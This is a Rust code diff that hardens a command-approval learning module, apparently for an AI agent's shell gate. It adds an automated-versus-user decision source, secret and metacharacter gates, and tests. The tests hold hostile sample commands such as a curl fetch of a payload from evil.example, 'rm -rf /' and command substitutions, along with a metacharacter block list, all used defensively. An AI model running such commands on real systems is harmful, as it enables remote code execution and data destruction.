@@ -1,9 +1,40 @@
 //! User decision tracking for auto-learning rules.
 
 use clx_core::config::Config;
+use clx_core::learned_pattern::{
+    is_well_formed_pattern, pattern_contains_secret, strip_env_assignments,
+};
+use clx_core::redaction::redact_secrets;
 use clx_core::storage::Storage;
 use clx_core::types::{LearnedRule, RuleType};
 use tracing::{debug, warn};
+
+/// Where a tracked decision originated.
+///
+/// Automated (LLM/L1-originated) denials must NEVER feed the auto-blacklist
+/// counter (Issue 9): only genuine user rejections learn. The `User` path
+/// preserves the historical V-R5 behaviour.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum DecisionSource {
+    /// A genuine user-originated decision (interactive approve/reject).
+    User,
+    /// An automated/LLM-originated decision (e.g. an L1 deny verdict).
+    Automated,
+}
+
+/// Shell metacharacters that mark a RAW command as compound/substitution and so
+/// unsafe to learn from (extraction would generalize them away). Mirrors the
+/// reject-set of the shared `is_well_formed_pattern` body check.
+const RAW_COMPOUND_METACHARS: &[&str] = &[";", "&&", "||", "|", "$(", "`", "<(", ">("];
+
+/// Return `true` if the RAW command must be rejected before any pattern
+/// extraction: it trips the shared secret detector OR contains a
+/// compound/substitution metacharacter. This catches `SSHPASS=... ssh` and
+/// `git diff | cat` BEFORE extraction generalizes them into an innocuous-looking
+/// stored pattern.
+fn raw_command_is_unsafe(command: &str) -> bool {
+    pattern_contains_secret(command) || RAW_COMPOUND_METACHARS.iter().any(|m| command.contains(m))
+}
 
 /// Commands that should never be auto-whitelisted due to destructive potential.
 ///
@@ -37,6 +68,7 @@ const NEVER_AUTO_WHITELIST: &[&str] = &[
 /// Check whether the base command (first word) of a command string is restricted
 /// from auto-whitelisting.
 pub(crate) fn is_restricted_command(command: &str) -> bool {
+    let command = strip_env_assignments(command);
     let base_cmd = command.split_whitespace().next().unwrap_or("");
     NEVER_AUTO_WHITELIST.contains(&base_cmd)
 }
@@ -133,7 +165,28 @@ pub(crate) fn track_user_decision(
     command: &str,
     project_path: &str,
     approved: bool,
+    source: DecisionSource,
 ) {
+    // Issue 9: automated/LLM-originated denials must never learn. Early-return
+    // before any insert/increment/flip so an automated L1 deny can never reach
+    // the auto-blacklist counter.
+    if source == DecisionSource::Automated && !approved {
+        debug!("Skipping learning for automated denial (Issue 9)");
+        return;
+    }
+
+    // Issue 1 RAW-command gate: reject before pattern extraction if the raw
+    // command trips the secret detector or carries compound/substitution
+    // metachars. Extraction would otherwise generalize a secret-bearing or
+    // compound command into an innocuous-looking stored pattern.
+    if raw_command_is_unsafe(command) {
+        warn!(
+            "Skipping learning for unsafe raw command: {}",
+            redact_secrets(command)
+        );
+        return;
+    }
+
     // Load config for learning thresholds
     let config = Config::load().unwrap_or_default();
 
@@ -171,7 +224,10 @@ pub(crate) fn track_user_decision(
 
             // Check if we should auto-blacklist
             if rule.denial_count >= config.user_learning.auto_blacklist_threshold as i32 {
-                let base_cmd = command.split_whitespace().next().unwrap_or("");
+                let base_cmd = strip_env_assignments(command)
+                    .split_whitespace()
+                    .next()
+                    .unwrap_or("");
                 let cmd_name = std::path::Path::new(base_cmd)
                     .file_name()
                     .and_then(|n| n.to_str())
@@ -200,6 +256,15 @@ pub(crate) fn track_user_decision(
             }
         }
 
+        // Issue 1 pattern-level belt+braces: never write a malformed/over-broad
+        // pattern (allows `*`/`/`).
+        if !is_well_formed_pattern(&rule.pattern) {
+            warn!(
+                "Skipping update of malformed learned pattern: {}",
+                redact_secrets(&rule.pattern)
+            );
+            return;
+        }
         if let Err(e) = storage.add_rule(&rule) {
             warn!("Failed to update rule: {}", e);
         }
@@ -218,6 +283,15 @@ pub(crate) fn track_user_decision(
         rule.confirmation_count = i32::from(approved);
         rule.denial_count = i32::from(!approved);
 
+        // Issue 1 pattern-level belt+braces: never write a malformed/over-broad
+        // pattern (allows `*`/`/`).
+        if !is_well_formed_pattern(&rule.pattern) {
+            warn!(
+                "Skipping insert of malformed learned pattern: {}",
+                redact_secrets(&rule.pattern)
+            );
+            return;
+        }
         if let Err(e) = storage.add_rule(&rule) {
             warn!("Failed to add rule: {}", e);
         }
@@ -226,6 +300,7 @@ pub(crate) fn track_user_decision(
 
 /// Extract a generalizable pattern from a command
 pub(crate) fn extract_command_pattern(command: &str) -> String {
+    let command = strip_env_assignments(command);
     let parts: Vec<&str> = command.split_whitespace().collect();
 
     if parts.is_empty() {
@@ -278,8 +353,8 @@ mod tests {
         let project = "/tmp/project";
 
         // Act — call (threshold-1) = 2 times with approved=true
-        track_user_decision(&storage, command, project, true);
-        track_user_decision(&storage, command, project, true);
+        track_user_decision(&storage, command, project, true, DecisionSource::User);
+        track_user_decision(&storage, command, project, true, DecisionSource::User);
 
         // Assert — pattern exists but is still tracking (RuleType::Allow is the initial
         // value assigned on first decision; what must NOT happen is confirmation_count
@@ -307,7 +382,7 @@ mod tests {
 
         // Act — call threshold (3) times
         for _ in 0..3 {
-            track_user_decision(&storage, command, project, true);
+            track_user_decision(&storage, command, project, true, DecisionSource::User);
         }
 
         // Assert
@@ -335,7 +410,7 @@ mod tests {
 
         // Act — call threshold (2) times with approved=false
         for _ in 0..2 {
-            track_user_decision(&storage, command, project, false);
+            track_user_decision(&storage, command, project, false, DecisionSource::User);
         }
 
         // Assert
@@ -361,8 +436,8 @@ mod tests {
         let project = "/tmp/project";
 
         // Act — 1 allow then 1 deny (both counts < their respective thresholds)
-        track_user_decision(&storage, command, project, true);
-        track_user_decision(&storage, command, project, false);
+        track_user_decision(&storage, command, project, true, DecisionSource::User);
+        track_user_decision(&storage, command, project, false, DecisionSource::User);
 
         // Assert
         let pattern = extract_command_pattern(command);
@@ -399,7 +474,7 @@ mod tests {
         let command = "curl http://evil.example";
         let project = "/tmp/project";
 
-        track_user_decision(&storage, command, project, false);
+        track_user_decision(&storage, command, project, false, DecisionSource::User);
 
         let pattern = extract_command_pattern(command);
         let rule = storage
@@ -423,12 +498,14 @@ mod tests {
     #[test]
     fn test_v_r5_deny_path_reaches_auto_blacklist() {
         let storage = Storage::open_in_memory().expect("in-memory storage");
-        let command = "curl http://evil.example/payload.sh";
+        // NOTE: the command must survive the Issue 1 RAW gate (no secret-shaped
+        // / high-entropy token, no compound metachars), so we use a plain host.
+        let command = "curl http://evil.example";
         let project = "/tmp/project";
 
         // Default auto_blacklist_threshold = 2.
-        track_user_decision(&storage, command, project, false);
-        track_user_decision(&storage, command, project, false);
+        track_user_decision(&storage, command, project, false, DecisionSource::User);
+        track_user_decision(&storage, command, project, false, DecisionSource::User);
 
         let pattern = extract_command_pattern(command);
         let rule = storage
@@ -451,7 +528,7 @@ mod tests {
         let command = "curl http://safe.example";
         let project = "/tmp/project";
 
-        track_user_decision(&storage, command, project, true);
+        track_user_decision(&storage, command, project, true, DecisionSource::User);
 
         let pattern = extract_command_pattern(command);
         let rule = storage
@@ -478,10 +555,10 @@ mod tests {
 
         // Act — record the same pattern multiple times
         for _ in 0..3 {
-            track_user_decision(&storage, command, project, true);
+            track_user_decision(&storage, command, project, true, DecisionSource::User);
         }
         // Record once more beyond threshold
-        track_user_decision(&storage, command, project, true);
+        track_user_decision(&storage, command, project, true, DecisionSource::User);
 
         // Assert — only one rule exists for this pattern (ON CONFLICT DO UPDATE)
         let pattern = extract_command_pattern(command);
@@ -491,6 +568,178 @@ mod tests {
             matching.len(),
             1,
             "should have exactly one rule for the pattern, not a duplicate"
+        );
+    }
+
+    // =====================================================================
+    // Issue 1 — learning gates
+    // =====================================================================
+
+    /// AC1.1: a leading `ENV=VALUE` run is stripped before pattern extraction,
+    /// so the secret value never reaches the stored pattern shape.
+    #[test]
+    fn ac1_1_env_stripped_from_extracted_pattern() {
+        let pattern = extract_command_pattern("SSHPASS='p w' ssh host");
+        assert!(
+            !pattern.contains("SSHPASS") && !pattern.contains("p w"),
+            "env assignment must be stripped from the pattern, got: {pattern}"
+        );
+        assert_eq!(pattern, "Bash(ssh:*)");
+    }
+
+    /// AC1.2 (new-insert path): a secret-bearing command stores NO rule.
+    /// The raw command uses a high-entropy token whose extracted pattern would
+    /// generalize the secret away — proving the RAW gate (not the pattern gate)
+    /// catches it.
+    #[test]
+    fn ac1_2_secret_command_stores_no_rule_new_path() {
+        let storage = Storage::open_in_memory().expect("in-memory storage");
+        // `curl` is not extracted with a subcommand, so the pattern would be
+        // `Bash(curl:*)` (secret generalized away). The RAW gate must catch the
+        // high-entropy token in the raw command first.
+        let command = "curl -H aGVsbG9TZWNyZXRUb2tlbkFiYzEyMzQ1Njc4OTBYWVo https://x";
+        track_user_decision(&storage, command, "/tmp/p", false, DecisionSource::User);
+
+        assert!(
+            storage.get_rules().expect("get_rules").is_empty(),
+            "secret-bearing raw command must not create any rule (new path)"
+        );
+    }
+
+    /// AC1.2 (update path): an existing rule is not updated from a
+    /// secret-bearing command (the RAW gate returns before the update).
+    #[test]
+    fn ac1_2_secret_command_stores_no_rule_update_path() {
+        let storage = Storage::open_in_memory().expect("in-memory storage");
+        // Seed a clean rule via a benign decision.
+        track_user_decision(
+            &storage,
+            "curl https://x",
+            "/tmp/p",
+            false,
+            DecisionSource::User,
+        );
+        let pattern = extract_command_pattern("curl https://x");
+        let before = storage
+            .get_rule_by_pattern(&pattern)
+            .expect("query")
+            .expect("seeded rule");
+
+        // Now a secret-bearing command that maps to the SAME pattern.
+        let command = "curl aGVsbG9TZWNyZXRUb2tlbkFiYzEyMzQ1Njc4OTBYWVo";
+        track_user_decision(&storage, command, "/tmp/p", false, DecisionSource::User);
+
+        let after = storage
+            .get_rule_by_pattern(&pattern)
+            .expect("query")
+            .expect("rule still exists");
+        assert_eq!(
+            before.denial_count, after.denial_count,
+            "secret-bearing command must not increment/update the existing rule"
+        );
+    }
+
+    /// AC1.3: compound/substitution raw inputs never produce a stored rule.
+    #[test]
+    fn ac1_3_compound_inputs_store_no_rule() {
+        for command in [
+            "a; b",
+            "a && b",
+            "a || b",
+            "git diff | cat",
+            "echo $(whoami)",
+            "echo `whoami`",
+            "diff <(a) <(b)",
+        ] {
+            let storage = Storage::open_in_memory().expect("in-memory storage");
+            track_user_decision(&storage, command, "/tmp/p", true, DecisionSource::User);
+            assert!(
+                storage.get_rules().expect("get_rules").is_empty(),
+                "compound command must not create a rule: {command}"
+            );
+        }
+    }
+
+    /// AC1.4: `is_restricted_command` applies env-stripping, so a leading
+    /// assignment no longer hides a restricted base command.
+    #[test]
+    fn ac1_4_is_restricted_command_strips_env() {
+        assert!(
+            is_restricted_command("FOO=bar rm -rf /"),
+            "env-prefixed `rm` must be recognized as restricted"
+        );
+    }
+
+    // =====================================================================
+    // Issue 9 — automated denials do not learn
+    // =====================================================================
+
+    /// AC9.1: automated denials never create a rule, even past the threshold.
+    #[test]
+    fn ac9_1_automated_deny_does_not_blacklist() {
+        let storage = Storage::open_in_memory().expect("in-memory storage");
+        let command = "curl http://evil.example/payload.sh";
+
+        // Default auto_blacklist_threshold = 2; exceed it.
+        for _ in 0..3 {
+            track_user_decision(
+                &storage,
+                command,
+                "/tmp/p",
+                false,
+                DecisionSource::Automated,
+            );
+        }
+
+        assert!(
+            storage.get_rules().expect("get_rules").is_empty(),
+            "automated denials must never create a learned rule"
+        );
+    }
+
+    /// AC9.3: an explicit user allow is not overridden by accumulated automated
+    /// denials (the automated denials are no-ops, so the Allow rule survives).
+    #[test]
+    fn ac9_3_explicit_allow_not_overridden_by_automated_denials() {
+        let storage = Storage::open_in_memory().expect("in-memory storage");
+        let command = "curl http://safe.example";
+
+        // User approves enough times to auto-whitelist.
+        for _ in 0..3 {
+            track_user_decision(&storage, command, "/tmp/p", true, DecisionSource::User);
+        }
+        let pattern = extract_command_pattern(command);
+        assert_eq!(
+            storage
+                .get_rule_by_pattern(&pattern)
+                .expect("query")
+                .expect("rule")
+                .rule_type,
+            RuleType::Allow
+        );
+
+        // Many automated denials must not flip it.
+        for _ in 0..5 {
+            track_user_decision(
+                &storage,
+                command,
+                "/tmp/p",
+                false,
+                DecisionSource::Automated,
+            );
+        }
+        let rule = storage
+            .get_rule_by_pattern(&pattern)
+            .expect("query")
+            .expect("rule");
+        assert_eq!(
+            rule.rule_type,
+            RuleType::Allow,
+            "automated denials must not override an explicit allow"
+        );
+        assert_eq!(
+            rule.denial_count, 0,
+            "automated denials must not increment denial_count"
         );
     }
 }
